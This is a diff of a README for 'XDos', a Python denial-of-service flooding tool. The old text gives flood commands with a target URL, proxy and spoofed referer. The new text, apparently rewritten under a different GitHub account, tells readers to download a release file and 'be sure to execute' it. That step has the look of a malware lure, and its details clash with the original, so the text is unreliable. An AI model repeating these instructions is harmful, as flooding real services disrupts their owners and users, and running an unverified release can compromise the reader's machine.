@@ -1,76 +1,115 @@
-# Denial of Service (DoS) Attack Simulation Script — Educational Python Tool 🐍💻
+# XDos: A Simple Python DoS Simulation Tool 🐍
 
-This repository contains a simple yet effective Python script designed to simulate a basic Denial of Service (DoS) attack. This script serves primarily educational and testing purposes, allowing users—especially students, cybersecurity enthusiasts, and developers—to gain a foundational understanding of how DoS attacks function at a technical level by generating multiple requests to a target server or endpoint.
+Welcome to the **XDos** repository! This project features a straightforward Python script designed to simulate basic Denial-of-Service (DoS) attacks. It serves as an educational tool to help users understand the fundamentals of DoS attacks, stress test endpoints, and enhance their knowledge in cybersecurity. 
 
-## What is a DoS Attack? ❓🚪
+**Important:** This tool is intended for ethical use only. Please use it responsibly and never for malicious purposes.
 
-A Denial of Service attack is a cyberattack method aimed at making a network service unavailable by overwhelming it with excessive requests or traffic. Unlike Distributed Denial of Service (DDoS) attacks, which originate from multiple sources simultaneously, a basic DoS attack typically comes from a single machine. Understanding these attack vectors is critical in cybersecurity for developing defensive strategies, stress testing servers, and improving system robustness.
+## Table of Contents
 
-## Purpose and Use Cases 🎯🧪
-
-This script is intended strictly for ethical use and academic exploration. By running this script in controlled environments—such as lab networks or servers where you have explicit permission—you can:
-
-- Experiment with how servers respond to high request volumes 📈  
-- Test the limits and resilience of your own web applications or services 🔧  
-- Understand the importance of security measures like rate limiting, firewalls, and intrusion detection systems 🛡️  
-- Learn the underlying mechanics of network traffic flooding in a hands-on manner 🌊  
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Disclaimer](#disclaimer)
+- [Links](#links)
 
 ## Features ⚙️
 
-- Lightweight Python implementation 🐍: Easy to read, modify, and extend according to your testing needs  
-- Customizable target and port 🎯: Specify the IP address or domain and the port number you wish to test  
-- Basic packet flooding 🌧️: Sends continuous requests to the target to simulate stress  
-- Minimal dependencies 📦: Runs on any system with Python installed without additional libraries  
-- Educational comments 📚: Inline explanations to help users understand each part of the code  
-- Non-malicious intent 🚫: Designed for learning, not for causing harm
+- **Lightweight Python Script**: Easy to download and run.
+- **Custom Target & Port Input**: Specify your own target IP address and port.
+- **Lab Testing & Learning**: Ideal for educational environments to understand DoS principles.
+- **Ethical Use**: Strictly for learning and testing purposes.
 
-## Ethical Considerations and Legal Disclaimer ⚠️
+## Installation 🛠️
 
-IMPORTANT: This script is designed and shared solely for educational purposes and authorized testing. Unauthorized use against servers or networks without permission is illegal and unethical. Misusing this tool can cause real damage and may have legal consequences. Users are responsible for ensuring they comply with all applicable laws and obtain explicit consent before conducting any testing.
+To get started with XDos, follow these simple steps:
 
-I am NOT responsible for any misuse or damage caused by users of this script. Use at your own risk. ⚠️
-
-By using this script, you acknowledge that the author is not liable for any misuse or damage resulting from its use.
-
-## Getting Started 🚀
-
-To get started, simply clone the repository, review the code to understand its workings, and run it against servers you own or have permission to test. Always practice responsible cybersecurity and avoid any actions that may disrupt legitimate services.
-
-## How to Run XDos on Termux 🚀
-
-1. Open Termux 📱  
-2. Clone the XDos Repository 🧬  
+1. **Clone the Repository**:
+   Open your terminal and run the following command:
    ```bash
-   git clone https://github.com/blei920/XDos.git
+   git clone https://github.com/Ritamnhit/XDos.git
    ```
-
-3. Navigate to the Project Folder 📁  
+   
+2. **Navigate to the Directory**:
+   Change to the XDos directory:
    ```bash
    cd XDos
    ```
 
-4. Run the Script 🐍  
+3. **Install Dependencies**:
+   Ensure you have Python installed. You can install any required packages using:
    ```bash
-   python XDos.py
+   pip install -r requirements.txt
    ```
 
+4. **Download the Script**:
+   You can download the latest release from the [Releases section](https://github.com/Ritamnhit/XDos/releases). Be sure to execute the downloaded file.
 
-## How to Use the Arguments ⚙️
+## Usage 📖
 
-To launch an attack (for testing/educational purposes only), use the format below:
+Using XDos is straightforward. Here’s how to run the script:
 
+1. **Open Your Terminal**:
+   Navigate to the directory where you downloaded XDos.
+
+2. **Run the Script**:
+   Execute the script with the following command:
    ```bash
-python XDos.py -u <CHANGE THIS TO TARGET URL> -r 100 -m GET --fast --proxy <CHANGE THIS TO YOUR PROXY> --refer "https://bing.com"
-```
+   python xdos.py --target <TARGET_IP> --port <PORT>
+   ```
+   Replace `<TARGET_IP>` with the IP address you want to test and `<PORT>` with the desired port number.
 
-⚠️ Replace:
-- <CHANGE THIS TO TARGET URL> with the actual target URL (remove the < >)
-- <CHANGE THIS TO YOUR PROXY> with your working proxy (remove the < >)
+3. **Monitor the Output**:
+   The script will begin sending packets to the specified target and port. You can monitor the output in your terminal to see how the endpoint responds.
 
-Example:
+## Contributing 🤝
 
+We welcome contributions from the community! If you want to improve XDos, follow these steps:
+
+1. **Fork the Repository**: Click on the fork button at the top right of this page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix:
    ```bash
-python XDos.py -u https://example.com -r 100 -m GET --fast --proxy 127.0.0.1:8080 --refer "https://bing.com"
-```
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your changes in the code.
+4. **Commit Your Changes**: Use clear commit messages:
+   ```bash
+   git commit -m "Add feature description"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."
 
-⚠️ Disclaimer: This tool is for **educational and authorized testing only**. Do not target websites you don’t own or have permission to test.
+## License 📜
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Disclaimer ⚠️
+
+XDos is designed for educational purposes only. The developers do not endorse any malicious use of this tool. Always ensure you have permission to test any system before using this script.
+
+## Links 🔗
+
+For more information and to download the latest version, visit the [Releases section](https://github.com/Ritamnhit/XDos/releases). You can find the latest updates and improvements there.
+
+![Download Button](https://img.shields.io/badge/Download_Latest_Release-Release-brightgreen)
+
+## Topics
+
+This repository covers a variety of topics relevant to cybersecurity and ethical hacking. Here are some of the key areas:
+
+- Basic Cyber Attacks
+- DDoS and DoS
+- Educational Tools
+- Ethical Hacking Practices
+- Python Programming
+- Testing Tools
+
+## Conclusion
+
+XDos is a valuable tool for anyone looking to learn about DoS attacks in a safe and ethical manner. By following the instructions in this README, you can easily set up and start using the script. Always remember to use it responsibly and respect the systems you test.
+
+Thank you for your interest in XDos! Happy learning!
